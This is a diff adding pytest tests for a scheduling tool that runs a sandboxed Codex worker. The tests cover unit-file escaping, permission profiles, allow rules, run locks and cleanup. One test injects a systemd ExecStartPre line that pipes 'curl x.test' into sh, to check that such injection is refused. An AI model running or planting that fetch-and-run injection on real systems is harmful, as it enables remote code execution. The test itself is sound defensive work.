@@ -586,3 +586,262 @@ def test_a_run_that_says_nothing_for_too_long_is_stopped_and_handed_on(
     assert not outcome.ok and not outcome.timed_out and len(calls) == 2
     assert "said nothing" in outcome.reason
     assert len(alerts) == 1
+
+
+@pytest.mark.parametrize("option", ["--title", "--alert", "--folder", "--name"])
+def test_install_refuses_a_line_break_that_would_add_a_directive(
+    computer: Callable[[str], Calls], capsys: pytest.CaptureFixture[str], folder: Path, option: str
+) -> None:
+    computer("Linux")
+    values = {"--title": "T", "--alert": "A", "--folder": str(folder), "--name": "graveyard-killer-worker"}
+    values[option] += "\nExecStartPre=/bin/sh -c 'curl x.test | sh'"
+    code, out = cli(capsys, "install", "--time", "9:05", "--model", MODEL, "--library", LIBRARY,
+                    *(part for pair in values.items() for part in pair))
+    assert code == 2 and "line break" in out["error"]
+
+
+def test_a_unit_file_value_never_holds_a_line_break() -> None:
+    assert schedule.systemd_value("a\nExecStartPre=x\r%$") == "a ExecStartPre=x %%$$"
+
+
+# ---------------------------------------------------------------- Codex: the run folder
+
+@pytest.fixture
+def codex_home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
+    home = tmp_path / "codex home"
+    home.mkdir()
+    (home / "config.toml").write_text('model = "gpt-6-luna"\n\n[mcp_servers.notion]\nurl = "https://mcp.notion.com/mcp"\n')
+    monkeypatch.setenv("CODEX_HOME", str(home))
+    monkeypatch.setattr(schedule, "find_codex", lambda: ["/opt/bin/codex"])
+    return home
+
+
+def codex_folder(capsys: pytest.CaptureFixture[str], folder: Path) -> dict[str, Any]:
+    code, out = cli(capsys, "codex", "--folder", str(folder), "--library", LIBRARY)
+    assert code == 0, out
+    return out
+
+
+def test_codex_writes_the_run_folder_and_trusts_it(
+    codex_home: Path, capsys: pytest.CaptureFixture[str], folder: Path
+) -> None:
+    out = codex_folder(capsys, folder)
+
+    # The app's task only starts codex-run, by full paths, which runs the Worker in the folder's sandbox.
+    schedule_py = SCRIPTS.resolve() / "schedule.py"
+    assert f"python3 {schedule_py} codex-run --folder '{folder}'\n" in out["prompt"]
+    assert out["prompt"].endswith(f"Graveyard Killer Library: {LIBRARY}\n")
+    assert "never start it again while it runs" in out["prompt"]
+    assert (out["model"], out["effort"]) == (schedule.CODEX_MODEL, "high")
+    settings = json.loads((folder / "codex.json").read_text())
+    assert (settings["library"], settings["codex"]) == (LIBRARY, ["/opt/bin/codex"])
+    for written in (".codex/config.toml", ".codex/rules/graveyard-killer.rules", "AGENTS.md"):
+        assert str(folder / written) in out["written"]
+    assert (folder / "work").is_dir()
+    agents = (folder / "AGENTS.md").read_text()
+    assert agents.startswith(f"Graveyard Killer Library: {LIBRARY}\n")
+    assert f"python3 {SCRIPTS.resolve() / 'post.py'} read '<link>'" in agents
+    assert "never through a heredoc" in agents
+    tomllib = pytest.importorskip("tomllib")
+    config = tomllib.loads((codex_home / "config.toml").read_text())
+    assert config["projects"][str(folder)] == {"trust_level": "trusted"}
+    assert config["mcp_servers"]["notion"]["url"] == "https://mcp.notion.com/mcp"  # the rest is kept
+
+
+def test_the_codex_profile_reads_only_the_skills_and_the_run_folder_and_has_no_network(
+    codex_home: Path, capsys: pytest.CaptureFixture[str], folder: Path
+) -> None:
+    tomllib = pytest.importorskip("tomllib")
+    codex_folder(capsys, folder)
+    config = tomllib.loads((folder / ".codex/config.toml").read_text())
+
+    assert config["default_permissions"] == "graveyard-killer"
+    # A scheduled task runs with approval_policy "never" by itself; a chat here may ask the user.
+    assert "approval_policy" not in config
+    assert "sandbox_mode" not in config  # it would replace the permission profile
+    environment = config["shell_environment_policy"]
+    assert environment["inherit"] == "core"
+    assert environment["set"]["TMPDIR"] == str(folder / "work")
+    profile = config["permissions"]["graveyard-killer"]
+    filesystem = {k: v for k, v in profile["filesystem"].items() if k != ":workspace_roots"}
+    assert filesystem == {":minimal": "read", str(SCRIPTS.resolve().parents[1]): "read"}
+    assert profile["filesystem"][":workspace_roots"] == {".": "read"}
+    assert profile["network"] == {"enabled": False}
+    # Notion's writes need no approval: nobody is there to give it.
+    assert config["mcp_servers"]["notion"] == {"url": "https://mcp.notion.com/mcp", "default_tools_approval_mode": "approve"}
+
+
+def test_the_codex_rules_let_out_only_the_skill_s_scripts_by_full_path(
+    codex_home: Path, capsys: pytest.CaptureFixture[str], folder: Path
+) -> None:
+    codex_folder(capsys, folder)
+    rules = (folder / ".codex/rules/graveyard-killer.rules").read_text()
+
+    scripts, task = [json.loads(found) for found in re.findall(r"pattern = (\[.*\]),\n", rules)]
+    assert scripts[0][:2] == ["python3", "python"]
+    assert scripts[1] == [str(SCRIPTS.resolve() / "post.py"), str(SCRIPTS.resolve() / "link.py")]
+    # schedule.py gets out only for codex-run: never install, remove or another command.
+    assert task[1:] == [str(SCRIPTS.resolve() / "schedule.py"), "codex-run"]
+    assert rules.count('decision = "allow"') == 2
+    assert "scripts/post.py\"" not in rules.replace(str(SCRIPTS.resolve()), "")  # no relative call
+
+
+def test_codex_again_keeps_the_pointer_and_trusts_the_folder_once(
+    codex_home: Path, capsys: pytest.CaptureFixture[str], folder: Path
+) -> None:
+    folder.mkdir(parents=True)
+    (folder / "AGENTS.md").write_text("Graveyard Killer Library: x\nLì ci sono i post che ho salvato.\n"
+                                      "Graveyard Killer's scripts are in /old/place. Run each one…\n")
+    codex_folder(capsys, folder)
+    out = codex_folder(capsys, folder)
+
+    agents = (folder / "AGENTS.md").read_text()
+    assert agents.startswith("Graveyard Killer Library: x\nLì ci sono i post che ho salvato.\n")
+    assert agents.count("Graveyard Killer's scripts are in ") == 1 and "/old/place" not in agents
+    assert str(folder / "AGENTS.md") not in out["written"]
+    assert (codex_home / "config.toml").read_text().count(f"[projects.{json.dumps(str(folder))}]") == 1
+
+
+@pytest.mark.parametrize("option, value", [("--folder", "run\nfolder"), ("--library", LIBRARY + "\x01")])
+def test_codex_refuses_a_line_break_or_control_character(
+    codex_home: Path, capsys: pytest.CaptureFixture[str], tmp_path: Path, option: str, value: str
+) -> None:
+    given = {"--folder": str(tmp_path / "run"), "--library": LIBRARY, option: value}
+    code, out = cli(capsys, "codex", *(part for pair in given.items() for part in pair))
+    assert code == 2 and "line break" in out["error"]
+    assert not (tmp_path / "run").exists() and not (tmp_path / "run\nfolder").exists()
+
+
+def test_codex_refuses_a_library_that_is_not_a_link(
+    codex_home: Path, capsys: pytest.CaptureFixture[str], folder: Path
+) -> None:
+    code, out = cli(capsys, "codex", "--folder", str(folder), "--library", "my notion page")
+    assert code == 2 and "not a web link" in out["error"]
+    assert not folder.exists()
+
+
+def test_codex_trusts_the_folder_by_its_real_path(
+    codex_home: Path, capsys: pytest.CaptureFixture[str], tmp_path: Path
+) -> None:
+    real = tmp_path / "real"
+    real.mkdir()
+    link = tmp_path / "link"
+    link.symlink_to(real, target_is_directory=True)
+    schedule.prepare_codex_folder(link, LIBRARY)
+    config = (codex_home / "config.toml").read_text()
+    assert f"[projects.{json.dumps(str(real.resolve()))}]" in config
+    assert str(link) not in config
+
+
+def test_codex_needs_codex_s_command(
+    codex_home: Path, capsys: pytest.CaptureFixture[str], folder: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    monkeypatch.setattr(schedule, "find_codex", lambda: None)
+    code, out = cli(capsys, "codex", "--folder", str(folder), "--library", LIBRARY)
+    assert code == 2 and "codex" in out["error"]
+    assert not folder.exists()
+
+
+@pytest.fixture
+def codex_run(
+    codex_home: Path, folder: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], str]]:
+    """codex-run in a prepared run folder, with a fake codex that plays the given responses."""
+    log, scenario_file = tmp_path / "codex.jsonl", tmp_path / "scenario.json"
+    monkeypatch.setenv("GK_FAKE_OPENCODE_LOG", str(log))
+    monkeypatch.setenv("GK_FAKE_OPENCODE_SCENARIO", str(scenario_file))
+    schedule.prepare_codex_folder(folder, LIBRARY, codex=[sys.executable, str(FAKE_OPENCODE)], alert="Riordino fallito.")
+    capsys.readouterr()
+
+    def go(responses: list[dict[str, Any]]) -> tuple[schedule.Outcome, list[dict[str, Any]], str]:
+        scenario_file.write_text(json.dumps(responses))
+        outcome = schedule.codex_run(folder)
+        calls = [json.loads(line) for line in log.read_text().splitlines()] if log.exists() else []
+        return outcome, calls, capsys.readouterr().out
+
+    return go
+
+
+def codex_events(*texts: str) -> list[dict[str, Any]]:
+    return [{"type": "thread.started", "thread_id": "th_1"},
+            {"type": "item.completed", "item": {"type": "command_execution", "command": "python3 post.py read 'x'",
+                                                "exit_code": 0}},
+            *({"type": "item.completed", "item": {"type": "agent_message", "text": text}} for text in texts),
+            {"type": "turn.completed", "usage": {"input_tokens": 1, "output_tokens": 1}}]
+
+
+def test_codex_run_runs_the_worker_in_the_folder_and_prints_the_ping(
+    codex_run: Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], str]], folder: Path
+) -> None:
+    ping = "Ho letto 3 nuovi post.\n\n- **1.** Vuoi la lista della spesa?"
+    outcome, calls, printed = codex_run([{"events": codex_events("Leggo i post.", ping)}])
+
+    assert outcome.ok and outcome.session == "th_1"
+    assert printed == ping + "\n"
+    [call] = calls
+    assert call["argv"] == ["exec", "--json", "--skip-git-repo-check", schedule.PROMPT.format(library=LIBRARY)]
+    assert Path(call["cwd"]).resolve() == folder and call["pwd"] == str(folder)
+    log = (folder / "worker.log").read_text()
+    assert "  tool     command python3 post.py read 'x'\n" in log
+    last = json.loads((folder / "last-run.json").read_text())
+    assert last["ok"] and last["ping"] == ping and last["agent"] == "codex"
+    assert not (folder / ".worker-run.lock").exists()
+
+
+def test_codex_run_says_why_a_run_failed(
+    codex_run: Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], str]], folder: Path,
+    monkeypatch: pytest.MonkeyPatch
+) -> None:
+    notified: list[str] = []
+    real_run = subprocess.run
+
+    def run(command: list[str], **options: Any) -> Any:
+        if command[-1] == "notify":
+            notified.append(options["input"])
+            return subprocess.CompletedProcess(command, 0, '{"notified": true}', "")
+        return real_run(command, **options)
+
+    monkeypatch.setattr(subprocess, "run", run)
+    outcome, _, printed = codex_run([{"events": [{"type": "thread.started", "thread_id": "th_2"},
+                                                 {"type": "turn.failed", "error": {"message": "usage limit reached"}}],
+                                      "exit": 1}])
+    assert not outcome.ok
+    assert printed.startswith("Riordino fallito. usage limit reached. Log: ")
+    assert notified == ["Graveyard Killer\n" + printed]
+    assert not json.loads((folder / "last-run.json").read_text())["ok"]
+
+
+def test_codex_run_never_runs_twice_at_once(
+    codex_run: Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], str]], folder: Path
+) -> None:
+    (folder / ".worker-run.lock").write_text("123 2026-11-17T14:46:25\n")
+    outcome, calls, printed = codex_run([{"events": codex_events("x")}])
+    assert not outcome.ok and calls == []
+    assert "already going" in printed
+    assert (folder / ".worker-run.lock").exists()  # the other run's
+
+
+def test_codex_run_takes_over_a_lock_left_by_a_crash(
+    codex_run: Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], str]], folder: Path
+) -> None:
+    lock = folder / ".worker-run.lock"
+    lock.write_text("123 2026-11-16T14:46:25\n")
+    old = time.time() - schedule.RUN_TIME_LIMIT - 3600
+    os.utime(lock, (old, old))
+    outcome, calls, _ = codex_run([{"events": codex_events("Fatto.")}])
+    assert outcome.ok and len(calls) == 1 and not lock.exists()
+
+
+def test_codex_run_cleans_the_work_folders_a_run_left(
+    codex_run: Callable[..., tuple[schedule.Outcome, list[dict[str, Any]], str]], folder: Path
+) -> None:
+    left = folder / "work" / "graveyard-killer-7izjlt6s"
+    (left / "frames").mkdir(parents=True)
+    (left / ".graveyard-killer-work").write_text("")
+    other = folder / "work" / "graveyard-killer-not-ours"
+    other.mkdir()
+    outcome, _, _ = codex_run([{"events": codex_events("Fatto.")}])
+    assert outcome.ok
+    assert not left.exists()
+    assert other.exists()  # no marker: not post.py's, so it stays
+    assert "graveyard-killer-7izjlt6s, left by the run" in (folder / "worker.log").read_text()
